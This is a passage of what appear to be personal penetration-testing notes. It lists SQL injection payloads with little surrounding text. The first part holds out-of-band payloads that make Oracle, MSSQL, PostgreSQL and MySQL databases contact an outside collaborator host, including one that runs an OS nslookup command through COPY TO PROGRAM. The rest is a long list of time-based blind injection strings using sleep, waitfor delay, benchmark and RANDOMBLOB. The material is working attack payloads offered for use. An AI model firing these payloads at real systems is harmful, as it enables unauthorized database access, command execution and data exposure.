' SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--+-
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--+-
' SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')--+-
' UNION SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')--+-

' exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'--+-
' UNION exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'--+-
' UNION SELECT exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'--+-
' SELECT exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'--+-
' copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'--+-
' UNION SELECT copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'--+-
' SELECT copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'--+-
'LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')--+-
' SELECT LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')--+-
' UNION SELECT LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')--+-
```


tests
si se te va la flapa:
https://github.com/payloadbox/sql-injection-payload-list/tree/master/Intruder/detect
```
# from wapiti
sleep(5)#
1 or sleep(5)#
" or sleep(5)#
' or sleep(5)#
" or sleep(5)="
' or sleep(5)='
1) or sleep(5)#
") or sleep(5)="
') or sleep(5)='
1)) or sleep(5)#
")) or sleep(5)="
')) or sleep(5)='
;waitfor delay '0:0:5'--
);waitfor delay '0:0:5'--
';waitfor delay '0:0:5'--
";waitfor delay '0:0:5'--
');waitfor delay '0:0:5'--
");waitfor delay '0:0:5'--
));waitfor delay '0:0:5'--
'));waitfor delay '0:0:5'--
"));waitfor delay '0:0:5'--
benchmark(10000000,MD5(1))#
1 or benchmark(10000000,MD5(1))#
" or benchmark(10000000,MD5(1))#
' or benchmark(10000000,MD5(1))#
1) or benchmark(10000000,MD5(1))#
") or benchmark(10000000,MD5(1))#
') or benchmark(10000000,MD5(1))#
1)) or benchmark(10000000,MD5(1))#
")) or benchmark(10000000,MD5(1))#
')) or benchmark(10000000,MD5(1))#
pg_sleep(5)--
1 or pg_sleep(5)--
" or pg_sleep(5)--
' or pg_sleep(5)--
1) or pg_sleep(5)--
") or pg_sleep(5)--
') or pg_sleep(5)--
1)) or pg_sleep(5)--
")) or pg_sleep(5)--
')) or pg_sleep(5)--
AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
SLEEP(5)#
SLEEP(5)--
SLEEP(5)="
SLEEP(5)='
or SLEEP(5)
or SLEEP(5)#
or SLEEP(5)--
or SLEEP(5)="
or SLEEP(5)='
waitfor delay '00:00:05'
waitfor delay '00:00:05'--
waitfor delay '00:00:05'#
benchmark(50000000,MD5(1))
benchmark(50000000,MD5(1))--
benchmark(50000000,MD5(1))#
or benchmark(50000000,MD5(1))
or benchmark(50000000,MD5(1))--
or benchmark(50000000,MD5(1))#
pg_SLEEP(5)
pg_SLEEP(5)--
pg_SLEEP(5)#
or pg_SLEEP(5)
or pg_SLEEP(5)--
or pg_SLEEP(5)#
'\"
AnD SLEEP(5)
AnD SLEEP(5)--
AnD SLEEP(5)#
&&SLEEP(5)
&&SLEEP(5)--
&&SLEEP(5)#
' AnD SLEEP(5) ANd '1
'&&SLEEP(5)&&'1
ORDER BY SLEEP(5)
ORDER BY SLEEP(5)--
ORDER BY SLEEP(5)#
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
+benchmark(3200,SHA1(1))+'
+ SLEEP(10) + '
RANDOMBLOB(500000000/2)
AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
RANDOMBLOB(1000000000/2)
AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
 

```